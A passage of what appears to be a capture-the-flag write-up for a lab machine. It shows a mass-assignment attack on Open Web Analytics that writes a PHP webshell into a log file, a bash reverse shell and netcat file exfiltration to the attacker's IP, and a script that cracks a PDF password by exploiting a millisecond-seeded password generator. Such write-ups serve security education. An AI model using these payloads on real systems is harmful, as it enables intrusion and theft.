+<p>In the <a href="https://devel0pment.de/?p=2494">same blog post as above</a>, the author shows how to get execution from admin access. It involves a <a href="https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html">mass assignment vulnerability</a> in the configuration that allows me to set the logging level and log file to be a PHP file, and then get a webshell into that log and run it.</p>
+<h4 id="generate-malicious-log-file">Generate Malicious Log File</h4>
+<p>Clicking on settings, there’s a bunch of options I can configure:</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20230321113800439.png">
+<img alt="image-20230321113800439" src="https://0xdfimages.gitlab.io/img/image-20230321113800439.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="https://0xdfimages.gitlab.io/img/image-20230321113800439.png"><i>Click for full image</i></a></div>
+</div>
+<p>I’ll note the Event Log File Directory, as it gives the full path to the web directory:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321114238277.webp" type="image/webp"/>
+<img alt="image-20230321114238277" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321114238277.png"/>
+</picture>
+<p>Clicking the update button send this request:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/index.php?owa_do=base.optionsGeneral</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">openwebanalytics.vessel.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">748</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://openwebanalytics.vessel.htb</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">owa_userSession=admin; owa_passwordSession=0bed4ee9fdbd77fa4406bec47a6fe8eb0cf1d9e412594e9cb0f15fcfb308baa2</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+owa_config%5Bbase.resolve_hosts%5D=1&amp;owa_config%5Bbase.log_feedreaders%5D=1&amp;owa_config%5Bbase.log_robots%5D=0&amp;owa_config%5Bbase.log_named_users%5D=1&amp;owa_config%5Bbase.excluded_ips%5D=&amp;owa_config%5Bbase.anonymize_ips%5D=0&amp;owa_config%5Bbase.fetch_refering_page_info%5D=1&amp;owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM&amp;owa_config%5Bbase.query_string_filters%5D=&amp;owa_config%5Bbase.announce_visitors%5D=0&amp;owa_config%5Bbase.notice_email%5D=&amp;owa_config%5Bbase.geolocation_lookup%5D=1&amp;owa_config%5Bbase.track_feed_links%5D=1&amp;owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F&amp;owa_config%5Bbase.timezone%5D=America%2FLos_Angeles&amp;owa_nonce=7e9e9f4df7&amp;owa_action=base.optionsUpdate&amp;owa_module=base
+</code></pre></div></div>
+<p>Each item from the form is being submitted as a parameter here, and each in the format <code class="language-plaintext highlighter-rouge">owa_config[&lt;item&gt;]</code>. The two items mentioned in the post (<code class="language-plaintext highlighter-rouge">base.error_log_level</code> and <code class="language-plaintext highlighter-rouge">base.error_log_file</code>) are not options in the form or that are sent here. A mass assignment vuln is where I can add them and they get changed anyway! By setting the <code class="language-plaintext highlighter-rouge">error_log_level</code> to <code class="language-plaintext highlighter-rouge">2</code>, it will store all POST parameters in the log.</p>
+<p>I’ll remove all of the <code class="language-plaintext highlighter-rouge">owa_config[]</code> things, and add back in these two:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/index.php?owa_do=base.optionsGeneral</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">openwebanalytics.vessel.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">183</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://openwebanalytics.vessel.htb</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">owa_userSession=admin; owa_passwordSession=0bed4ee9fdbd77fa4406bec47a6fe8eb0cf1d9e412594e9cb0f15fcfb308baa2</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+owa_config%5Bbase.error_log_level%5D=2&amp;owa_config%5Bbase.error_log_file%5D=/var/www/html/owa/owa-data/logs/0xdf.php&amp;&amp;owa_nonce=7e9e9f4df7&amp;owa_action=base.optionsUpdate&amp;owa_module=base
+</code></pre></div></div>
+<p>After sending this, I can then read the log file:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321114533442.webp" type="image/webp"/>
+<img alt="image-20230321114533442" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321114533442.png"/>
+</picture>
+<h4 id="webshell">Webshell</h4>
+<p>The goal is to get some PHP into this log file. I’ll send a change options POST again, but this time with a made up item:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/index.php?owa_do=base.optionsGeneral</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">openwebanalytics.vessel.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">134</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://openwebanalytics.vessel.htb</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">owa_userSession=admin; owa_passwordSession=0bed4ee9fdbd77fa4406bec47a6fe8eb0cf1d9e412594e9cb0f15fcfb308baa2</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+owa_config%5Bbase.0xdf%5D=&lt;%3fphp+system($_REQUEST['cmd'])%3b+%3f&gt;&amp;&amp;owa_nonce=7e9e9f4df7&amp;owa_action=base.optionsUpdate&amp;owa_module=base
+</code></pre></div></div>
+<p>This will write the data (which is a webshell) into the log file. On accessing it with <code class="language-plaintext highlighter-rouge">?cmd=id</code> added to the end of the URL, it executes:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321115105872.webp" type="image/webp"/>
+<img alt="image-20230321115105872" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321115105872.png"/>
+</picture>
+<h4 id="shell">Shell</h4>
+<p>To get a shell via this webshell, I’ll visit <code class="language-plaintext highlighter-rouge">http://openwebanalytics.vessel.htb/owa-data/logs/0xdf.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.6/443%200%3E%261%27</code>. This is a simple <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a>, and connects back to a listening <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.178 41224
+bash: cannot set terminal process group (1003): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@vessel:/var/www/html/owa/owa-data/logs$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll do a <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">shell upgrade</a> with <code class="language-plaintext highlighter-rouge">script</code> and <code class="language-plaintext highlighter-rouge">stty</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@vessel:/var/www/html/owa/owa-data/logs$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">Script started, file is /dev/null
+</span><span class="gp">www-data@vessel:/var/www/html/owa/owa-data/logs$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+</span><span class="gp">Terminal type?</span><span class="w"> </span>screen
+<span class="gp">www-data@vessel:/var/www/html/owa/owa-data/logs$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-ethan">Shell as ethan</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="home-dirs">Home Dirs</h4>
+<p>There are two users on this box with home directories:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@vessel:/home$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 8
+drwx------ 5 ethan  ethan  4096 Aug 11  2022 ethan
+drwxrwxr-x 3 steven steven 4096 Aug 11  2022 steven
+</span></code></pre></div></div>
+<p>www-data can’t access ethan, but can see in steven’s:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@vessel:/home/steven$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 33796
+drwxrwxr-x 3 steven steven     4096 Aug 11  2022 .
+drwxr-xr-x 4 root   root       4096 Aug 11  2022 ..
+lrwxrwxrwx 1 root   root          9 Apr 18  2022 .bash_history -&gt; /dev/null
+-rw------- 1 steven steven      220 Apr 17  2022 .bash_logout
+-rw------- 1 steven steven     3771 Apr 17  2022 .bashrc
+drwxr-xr-x 2 ethan  steven     4096 Aug 11  2022 .notes
+-rw------- 1 steven steven      807 Apr 17  2022 .profile
+-rw-r--r-- 1 ethan  steven 34578147 May  4  2022 passwordGenerator
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">passwordGenerator</code> is a Windows exe:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@vessel:/home/steven$</span><span class="w"> </span>file passwordGenerator 
+<span class="go">passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">.notes</code> is a hidden directory with two files in it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@vessel:/home/steven$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> .notes/
+<span class="go">total 40
+-rw-r--r-- 1 ethan  steven 17567 Aug 10  2022 notes.pdf
+-rw-r--r-- 1 ethan  steven 11864 May  2  2022 screenshot.png
+</span></code></pre></div></div>
+<h4 id="file-analysis">File Analysis</h4>
+<p>I’ll exfil all three files back to my machine with <code class="language-plaintext highlighter-rouge">nc -lnvp 444 &gt; notes.pdf</code>, first starting a listener on my host, then sending the file into <code class="language-plaintext highlighter-rouge">nc</code> on Vessel:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@vessel:/home/steven$</span><span class="w"> </span><span class="nb">cat</span> .notes/notes.pdf | nc 10.10.14.6 444
+</code></pre></div></div>
+<p>After a few seconds, hit Ctrl-c and then check the hashes to make sure it transferred completely without corruption:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@vessel:/home/steven$</span><span class="w"> </span><span class="nb">md5sum</span> .notes/notes.pdf 
+<span class="go">d66c5ed1614aec0896605f65667826fd  .notes/notes.pdf
+</span></code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">md5sum </span>notes.pdf 
+<span class="go">d66c5ed1614aec0896605f65667826fd  notes.pdf
+</span></code></pre></div></div>
+<p>I’ll do the same for the other files.</p>
+<p><code class="language-plaintext highlighter-rouge">screenshot.png</code> is an image of the Secure Password Generator program:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321121257212.webp" type="image/webp"/>
+<img alt="image-20230321121257212" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321121257212.png"/>
+</picture>
+<p>The PDF is password protexted:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321121548754.webp" type="image/webp"/>
+<img alt="image-20230321121548754" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321121548754.png"/>
+</picture>
+<h3 id="passwordgenerator">passwordGenerator</h3>
+<h4 id="recover-python">Recover Python</h4>
+<p>Running <code class="language-plaintext highlighter-rouge">strings</code> on the file returns all sorts of hints that this is a Python executable:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>strings <span class="nt">-n</span> 10 passwordGenerator
+<span class="go">...[snip]...
+Py_FileSystemDefaultEncoding
+Failed to get address for Py_FileSystemDefaultEncoding
+Py_FrozenFlag
+Failed to get address for Py_FrozenFlag
+...[snip]...
+PyInstaller: FormatMessageW failed.
+PyInstaller: pyi_win32_utils_to_utf8 failed.
+...[snip]...
+3python37.dll
+</span></code></pre></div></div>
+<p>To get Python-like source from a PyIntaller exe, I’ll use <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python /opt/pyinstxtractor/pyinstxtractor.py passwordGenerator 
+<span class="go">[+] Processing passwordGenerator
+[+] Pyinstaller version: 2.1+
+[+] Python version: 3.7
+[+] Length of package: 34300131 bytes
+[+] Found 95 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_subprocess.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: pyi_rth_pyside2.pyc
+[+] Possible entry point: passwordGenerator.pyc
+[!] Warning: This script is running in a different Python version than the one used to build the executable.
+[!] Please run this script in Python 3.7 to prevent extraction errors during unmarshalling
+[!] Skipping pyz extraction
+[+] Successfully extracted pyinstaller archive: passwordGenerator
+
+You can now use a python decompiler on the pyc files within the extracted directory
+</span></code></pre></div></div>
+<p>I’ll note that the Python version of the exe is 3.7. To get a full picture, I’ll re-run it with Pyhton3.7:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python3.7 /opt/pyinstxtractor/pyinstxtractor.py passwordGenerator
+<span class="go">[+] Processing passwordGenerator
+[+] Pyinstaller version: 2.1+
+[+] Python version: 3.7
+[+] Length of package: 34300131 bytes
+[+] Found 95 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_subprocess.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: pyi_rth_pyside2.pyc
+[+] Possible entry point: passwordGenerator.pyc
+[+] Found 142 files in PYZ archive
+[+] Successfully extracted pyinstaller archive: passwordGenerator
+
+You can now use a python decompiler on the pyc files within the extracted directory  
+</span></code></pre></div></div>
+<p>This generates a bunch of DLLs and compiled Python byte code:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls </span>passwordGenerator_extracted/
+<span class="go">base_library.zip    _lzma.pyd                pyimod03_importers.pyc  python3.dll           Qt5QmlModels.dll        _socket.pyd
+_bz2.pyd            MSVCP140_1.dll           pyimod04_ctypes.pyc     PYZ-00.pyz            Qt5Quick.dll            _ssl.pyd
+_ctypes.pyd         MSVCP140.dll             pyi_rth_inspect.pyc     PYZ-00.pyz_extracted  Qt5Svg.dll              struct.pyc
+d3dcompiler_47.dll  opengl32sw.dll           pyi_rth_pkgutil.pyc     Qt5Core.dll           Qt5VirtualKeyboard.dll  unicodedata.pyd
+_hashlib.pyd        passwordGenerator.pyc    pyi_rth_pyside2.pyc     Qt5DBus.dll           Qt5WebSockets.dll       VCRUNTIME140.dll
+libcrypto-1_1.dll   pyexpat.pyd              pyi_rth_subprocess.pyc  Qt5Gui.dll            Qt5Widgets.dll
+libEGL.dll          pyiboot01_bootstrap.pyc  PySide2                 Qt5Network.dll        select.pyd
+libGLESv2.dll       pyimod01_os_path.pyc     pyside2.abi3.dll        Qt5Pdf.dll            shiboken2
+libssl-1_1.dll      pyimod02_archive.pyc     python37.dll            Qt5Qml.dll            shiboken2.abi3.dll
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">passwordGenerator.pyc</code> is the main program.</p>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">uncomplye6</code> to get back the Python source. I want to run it with the same version as the original, so I’ll create a virtual environment, activate it, and install <code class="language-plaintext highlighter-rouge">uncompyle6</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python3.7 <span class="nt">-m</span> venv venv
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">source </span>venv/bin/activate
+<span class="gp">(venv) oxdf@hacky$</span><span class="w"> </span>pip <span class="nb">install</span> <span class="nt">--upgrade</span> pip uncompyle6
+<span class="go">Requirement already satisfied: pip in ./venv/lib/python3.7/site-packages (22.0.4)
+Collecting pip
+  Using cached pip-23.0.1-py3-none-any.whl (2.1 MB)
+Collecting uncompyle6
+  Using cached uncompyle6-3.9.0-py37-none-any.whl (381 kB)
+...[snip]...
+Successfully installed click-8.1.3 importlib-metadata-6.1.0 pip-23.0.1 six-1.16.0 spark-parser-1.8.9 typing-extensions-4.5.0 uncompyle6-3.9.0 xdis-6.0.5 zipp-3.15.0
+</span></code></pre></div></div>
+<p>Running from the virtual env, I’ll dump the source:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(venv) oxdf@hacky$ </span>uncompyle6 passwordGenerator_extracted/passwordGenerator.pyc <span class="o">&gt;</span> passwordGenerator.py
+</code></pre></div></div>
+<h4 id="source-analysis">Source Analysis</h4>
+<p>The application is using the <a href="https://www.pythonguis.com/pyside6/">PySide</a> framework to create Python GUI programs:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">PySide2.QtCore</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">PySide2.QtGui</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">PySide2.QtWidgets</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">PySide2</span> <span class="kn">import</span> <span class="n">QtWidgets</span>
+<span class="kn">import</span> <span class="n">pyperclip</span>
+</code></pre></div></div>
+<p>There’s a bunch of stuff setting up the window, but the interesting function is <code class="language-plaintext highlighter-rouge">genPassword</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">def</span> <span class="nf">genPassword</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="n">value</span>
+        <span class="n">char</span> <span class="o">=</span> <span class="n">index</span>
+        <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">charset</span> <span class="o">=</span> <span class="sh">'</span><span class="s">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?</span><span class="sh">'</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="n">charset</span> <span class="o">=</span> <span class="sh">'</span><span class="s">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="sh">'</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+                    <span class="n">charset</span> <span class="o">=</span> <span class="sh">'</span><span class="s">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890</span><span class="sh">'</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="nf">qsrand</span><span class="p">(</span><span class="n">QTime</span><span class="p">.</span><span class="nf">currentTime</span><span class="p">().</span><span class="nf">msec</span><span class="p">())</span>
+                        <span class="n">password</span> <span class="o">=</span> <span class="sh">''</span>
+                        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+                            <span class="n">idx</span> <span class="o">=</span> <span class="nf">qrand</span><span class="p">()</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span>
+                            <span class="n">nchar</span> <span class="o">=</span> <span class="n">charset</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span>
+                            <span class="n">password</span> <span class="o">+=</span> <span class="nf">str</span><span class="p">(</span><span class="n">nchar</span><span class="p">)</span>
+
+                    <span class="k">except</span><span class="p">:</span>
+                        <span class="n">msg</span> <span class="o">=</span> <span class="nc">QMessageBox</span><span class="p">()</span>
+                        <span class="n">msg</span><span class="p">.</span><span class="nf">setWindowTitle</span><span class="p">(</span><span class="sh">'</span><span class="s">Error</span><span class="sh">'</span><span class="p">)</span>
+                        <span class="n">msg</span><span class="p">.</span><span class="nf">setText</span><span class="p">(</span><span class="sh">'</span><span class="s">Error while generating password!, Send a message to the Author!</span><span class="sh">'</span><span class="p">)</span>
+                        <span class="n">x</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="nf">exec_</span><span class="p">()</span>
+
+                <span class="k">return</span> <span class="n">password</span>
+</code></pre></div></div>
+<h3 id="crack-password">Crack Password</h3>
+<h4 id="attack---fail">Attack - Fail</h4>
+<p>The issue with the code above is that it it is seeding the pseudo-random number generator with a timestamp calling <code class="language-plaintext highlighter-rouge">.msec()</code>. <a href="https://doc.qt.io/qt-6/qtime.html#msec">This function</a> returns a number between 0 and 999, representing the millisecond part of the time. This means there are only 1000 possible seeds for the pseudo-random number generator and thus only 1000 possible passwords. The image also shows a password of length 32, and that all possible characters are involved (<code class="language-plaintext highlighter-rouge">char == 0</code> above).</p>
+<p>Knowing that, I can write a simple Python script to generate all 1000 passwords:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">PySide2.QtCore</span> <span class="kn">import</span> <span class="n">qsrand</span><span class="p">,</span> <span class="n">qrand</span>
+
+<span class="k">def</span> <span class="nf">genPassword</span><span class="p">(</span><span class="n">ms</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="mi">32</span>
+    <span class="n">charset</span> <span class="o">=</span> <span class="sh">'</span><span class="s">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?</span><span class="sh">'</span>
+
+    <span class="nf">qsrand</span><span class="p">(</span><span class="n">ms</span><span class="p">)</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="sh">''</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+        <span class="n">idx</span> <span class="o">=</span> <span class="nf">qrand</span><span class="p">()</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span>
+        <span class="n">nchar</span> <span class="o">=</span> <span class="n">charset</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span>
+        <span class="n">password</span> <span class="o">+=</span> <span class="nf">str</span><span class="p">(</span><span class="n">nchar</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">password</span>
+
+<span class="n">passwords</span> <span class="o">=</span> <span class="p">[</span><span class="nf">genPassword</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)]</span>
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">generated.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">passwords</span><span class="p">))</span>
+</code></pre></div></div>
+<p>When I run this, I get a file of passwords. I’ll try passing this wordlist to <code class="language-plaintext highlighter-rouge">pdfcrack</code> (<code class="language-plaintext highlighter-rouge">apt install pdfcrack</code>), but it fails to find a password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(venv) oxdf@hacky$ </span>pdfcrack <span class="nt">-f</span> notes.pdf <span class="nt">-w</span> generated.txt 
+<span class="go">PDF version 1.6
+Security Handler: Standard
+V: 2
+R: 3
+P: -1028
+Length: 128
+Encrypted Metadata: True
+FileID: c19b3bb1183870f00d63a766a1f80e68
+U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000
+O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86
+Could not find password
+</span></code></pre></div></div>
+<h4 id="success-from-windows">Success From Windows</h4>
+<p>It turns out that the libraries used by Python for QT are different on Linux than they are on Windows, so running this on a Windows machine generates a different list of passwords. If I generate the passwords there, and then try <code class="language-plaintext highlighter-rouge">pdfcrack</code>, it finds the password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(venv) oxdf@hacky$ </span>pdfcrack <span class="nt">-f</span> notes.pdf <span class="nt">-w</span> generated.txt 
+<span class="go">PDF version 1.6
+Security Handler: Standard
+V: 2
+R: 3
+P: -1028
+Length: 128
+Encrypted Metadata: True
+FileID: c19b3bb1183870f00d63a766a1f80e68
+U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000
+O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86
+found user-password: 'YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS'
+</span></code></pre></div></div>
+<h3 id="su--ssh">su / SSH</h3>
+<p>Opening the PDF with that password gives a short note from ethan to steven:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20230321133250770.webp" type="image/webp"/>
+<img alt="image-20230321133250770" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20230321133250770.png"/>
+</picture>
